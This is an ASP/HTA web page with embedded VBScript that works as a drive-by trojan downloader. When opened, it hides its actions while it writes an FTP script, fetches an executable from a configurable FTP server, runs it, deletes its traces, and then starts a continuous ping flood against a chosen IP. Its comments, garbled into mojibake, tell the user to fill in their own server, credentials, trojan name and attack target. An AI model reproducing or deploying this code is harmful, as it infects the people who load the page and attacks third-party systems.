   <%response.ContentType="application/hta"%>
   <html>
   <object id=wsh classid=clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B></object>
   <script language=vbscript>
   set wshshell=createobject ("wscript.shell" )
   Dim fso, tf
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set tf = fso.CreateTextFile("ftp.txt",true)
   tf.Write "open 127.0.0.1"&chr(13)&chr(10)
   '°Ñ127.0.0.1¸ÄÎªÄãµÄFTP¿Õ¼äµÄIPµØÖ·
   tf.Write "yourname"&chr(13)&chr(10)
   '°Ñyourname¸ÄÎªÄãµÄFTP¿Õ¼äµÄÓÃ»§Ãû
   tf.Write "yourpassword"&chr(13)&chr(10)
   '°Ñyourpassword¸ÄÎªÄãµÄFTP¿Õ¼äµÄÃÜÂë
   tf.Write "get xxx.exe"&chr(13)&chr(10)
   '°Ñxxx.exe¸ÄÎªÄãµÄFTP¿Õ¼äµÄÉÏµÄÄ¾Âí³ÌÐòµÄÃû×Ö¡£Èç¹ûÄ¾ÂíÔÚxxxÄ¿Â¼ÏÂÇëÊäÈëxxx\xxx.exe
   tf.Write "bye"
   tf.Close
   wsh.Run "cmd.exe /c ftp -s:ftp.txt", 0 ,true
   wsh.Run "cmd.exe /c del c:\winnt\system32\ftp.txt", 0 ,true
   wsh.Run "rr.exe"
   wsh.Run "cmd.exe /c ping 127.0.0.1 -t", 0 ,true
   '°Ñ127.0.0.1¸ÄÎªÄãÒª¹¥»÷µÄIP£¬Í¬Ê±¿ÉÒÔ²»µ¯³ö´°¿Ú
   window.close()
   </script>
   <script language="JavaScript">
   function clock(){
   document.title="·çÖÐÒ÷°®Äã";
   window.close()
   }
   clock();
   </script>


   </html>
